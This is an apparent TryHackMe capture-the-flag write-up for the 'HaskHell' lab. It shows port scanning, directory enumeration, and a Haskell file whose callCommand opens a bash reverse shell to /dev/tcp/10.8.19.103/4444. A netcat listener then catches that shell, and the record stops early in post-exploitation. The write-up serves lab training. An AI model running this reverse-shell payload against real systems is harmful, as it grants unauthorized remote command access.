# HaskHell — Writeup

## Overview
### HaskHell — Writeup
### HaskHell — Writeup
----
Teach your CS professor that his PhD isn't in security.
----
![](https://i.imgur.com/4AocURG.jpg)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/fcf1ff6eabd1d1e09500184b049a2e66.png)
Start Machine
Show your professor that his PhD isn't in security.
Please send comments/concerns/hatemail to @passthehashbrwn on Twitter.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.99.121 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.99.121:22
Open 10.10.99.121:5001
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.99.121 [2 ports]
Discovered open port 22/tcp on 10.10.99.121
Discovered open port 5001/tcp on 10.10.99.121
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.99.121
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.99.121.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.99.121
Host is up, received user-set (0.20s latency).

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1df353f76d5ba1d484510ddd66404d90 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD6azVu3Hr+20SblWk0j7SeT8U3VySD4u18ChyDYyOoZiza2PTe1qsuwnw06/kboHaLejqPmnxkMDWgEeXoW0L11q2D8mfSf8EVvk++7bNqQ0mlkjdcknOs11mdYqSOkM1yw06LolltKtjlf/FpT706QFkRKQO30fT4YgKY6GD71aYdafhTBgZlXA51pGyruDUOP+lqhVPvLZJnI/oOTWkv5kT0a3T+FGRZfEi+GBrhvxP7R7n3QFRSBDPKSBRYLVdlSYXPD83P1pND6F/r3BvyfHw4UY0yKbw+ntvhiRcUI2FYyN5Vj1Jrb6ipCnp5+UcFdmROOHSgWS5Qzzx5fPZB
|   256 267cbd338fbf09ac9ee3d30ac334bc14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMx1lBsNtSWJvxM159Ahr110Jpf3M/dVqblDAoVXd8QSIEYIxEgeqTdbS4HaHPYnFyO1j8s6fQuUemJClGw3Bh8=
|   256 d5fb55a0fde8e1ab9e46afb871900026 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICPmznEBphODSYkIjIjOA+0dmQPxltUfnnCTjaYbc39R
5001/tcp open  http    syn-ack Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.51 seconds

                                                                                                                    
┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.99.121:5001 -i200,301,302,401,500                                        

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/witty/.dirsearch/reports/10.10.99.121-5001/_23-06-22_14-00-33.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-06-22_14-00-33.log

Target: http://10.10.99.121:5001/

[14:00:33] Starting: 
[14:03:14] 200 -  237B  - /submit
[14:03:22] 200 -  131B  - /uploads/affwp-debug.log

Task Completed

┌──(witty㉿kali)-[~/Downloads]
└─$ nano revshell_haskell.hs
                                                 
┌──(witty㉿kali)-[~/Downloads]
└─$ cat revshellhaskell.hs 
import System.Process

main = do
     callCommand "bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'"

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444                     
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.99.121] 45358
bash: cannot set terminal process group (793): Inappropriate ioctl for device
bash: no job control in this shell
flask@haskhell:~$ which python
which python
/usr/bin/python
